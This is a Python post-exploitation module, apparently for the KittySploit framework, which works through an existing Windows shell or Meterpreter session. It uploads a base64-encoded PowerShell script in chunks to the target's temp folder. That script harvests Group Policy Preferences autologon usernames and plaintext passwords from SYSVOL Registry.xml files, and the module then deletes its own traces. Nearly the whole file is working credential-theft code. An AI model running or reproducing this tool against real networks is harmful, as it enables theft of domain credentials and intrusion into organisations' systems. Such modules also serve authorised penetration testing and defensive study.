#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64
import re


class Module(Post):
    _AUTO_CLEANUP = True

    __info__ = {
        "name": "Windows Get GPP Autologon",
        "description": (
            "Search SYSVOL Registry.xml files for Group Policy Preferences autologon "
            "credentials on a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://support.microsoft.com/en-us/topic/kb324737",
            "https://github.com/PowerShellMafia/PowerSploit",
        ],
    }

    domain = OptString("", "AD domain to query (default: USERDNSDOMAIN)", False)

    def _powershell_script(self) -> str:
        return r"""
function Get-GPPAutologon
{
    [CmdletBinding()]
    Param (
        [String]$Domain = ""
    )

    Set-StrictMode -Version 2

    function Get-GPPInnerFields
    {
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]$File
        )

        try
        {
            [xml]$Xml = Get-Content -LiteralPath $File
            $Password = @()
            $UserName = @()

            $props = $Xml.SelectNodes("//Properties")
            foreach ($prop in $props)
            {
                $pwd = $null
                $usr = $null

                if ($prop.Attributes["defaultPassword"]) { $pwd = $prop.Attributes["defaultPassword"].Value }
                elseif ($prop.Attributes["DefaultPassword"]) { $pwd = $prop.Attributes["DefaultPassword"].Value }

                if ($prop.Attributes["defaultUsername"]) { $usr = $prop.Attributes["defaultUsername"].Value }
                elseif ($prop.Attributes["DefaultUsername"]) { $usr = $prop.Attributes["DefaultUsername"].Value }
                elseif ($prop.Attributes["DefaultUserName"]) { $usr = $prop.Attributes["DefaultUserName"].Value }

                if ($null -ne $pwd -or $null -ne $usr)
                {
                    if ([String]::IsNullOrWhiteSpace($pwd)) { $Password += , '[BLANK]' }
                    else { $Password += , $pwd }

                    if ([String]::IsNullOrWhiteSpace($usr)) { $UserName += , '[BLANK]' }
                    else { $UserName += , $usr }
                }
            }

            if ($Password.Count -gt 0 -or $UserName.Count -gt 0)
            {
                [PSCustomObject]@{
                    Passwords = $Password
                    UserNames = $UserName
                    File = $File
                }
            }
        }
        catch
        {
            Write-Verbose "Failed parsing $File: $($_.Exception.Message)"
        }
    }

    try
    {
        if ((-not ((Get-WmiObject Win32_ComputerSystem).PartOfDomain)) -or (-not $Env:USERDNSDOMAIN))
        {
            throw "Machine is not a domain member or user is not a member of the domain."
        }

        if ([String]::IsNullOrWhiteSpace($Domain))
        {
            $Domain = $Env:USERDNSDOMAIN
        }

        $sysvol = "\\$Domain\SYSVOL"
        Write-Verbose "Searching $sysvol for Registry.xml files..."
        $XMLFiles = Get-ChildItem -Path $sysvol -Recurse -ErrorAction SilentlyContinue -Include "Registry.xml"

        if (-not $XMLFiles) { throw "No Registry.xml preference files found." }
        Write-Verbose "Found $($XMLFiles.Count) Registry.xml files."

        foreach ($File in $XMLFiles)
        {
            $Result = Get-GPPInnerFields -File $File.FullName
            if ($Result) { Write-Output $Result }
        }
    }
    catch
    {
        throw $_.Exception.Message
    }
}
"""

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _remote_temp_dir(self) -> str:
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _ps_single_quote(self, value: str) -> str:
        return str(value).replace("'", "''")

    def _write_remote_script(self, temp_dir: str):
        script_path = f"{temp_dir}\\get_gpp_autologon.ps1"
        blob_path = f"{temp_dir}\\get_gpp_autologon.b64"
        payload = base64.b64encode(self._powershell_script().encode("utf-8")).decode("ascii")
        chunks = [payload[i:i + 3500] for i in range(0, len(payload), 3500)]

        for index, chunk in enumerate(chunks):
            method = "WriteAllText" if index == 0 else "AppendAllText"
            ps = f"[IO.File]::{method}('{blob_path}','{chunk}');"
            self._run_powershell(ps)

        decode_script = (
            f"$b=[IO.File]::ReadAllText('{blob_path}');"
            f"[IO.File]::WriteAllText('{script_path}',"
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));"
        )
        self._run_powershell(decode_script)
        return script_path, blob_path

    def _cleanup_remote(self, paths):
        for path in paths:
            self._execute_cmd(f'del /f /q "{path}"')

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False
        return True

    def run(self):
        temp_dir = self._remote_temp_dir()
        print_status("Uploading Get-GPPAutologon payload...")
        script_path, blob_path = self._write_remote_script(temp_dir)

        selected_domain = self._ps_single_quote(str(self.domain or "").strip())
        invoke = (
            "$ErrorActionPreference='Stop';"
            f". '{self._ps_single_quote(script_path)}';"
            f"Get-GPPAutologon -Domain '{selected_domain}' -Verbose | "
            "Select-Object UserNames, File, Passwords | Format-List | Out-String"
        )

        print_status("Searching SYSVOL for GPP autologon entries...")
        result = self._run_powershell(invoke)

        if self._AUTO_CLEANUP:
            self._cleanup_remote([script_path, blob_path])

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned by Get-GPPAutologon")

        if re.search(r"(Exception|Cannot|error|failed|No Registry\.xml preference files found)", result, re.I):
            print_warning("No autologon credential found or PowerShell reported issues")

        print_success("Get-GPPAutologon completed")
        print_info(result)
        return True
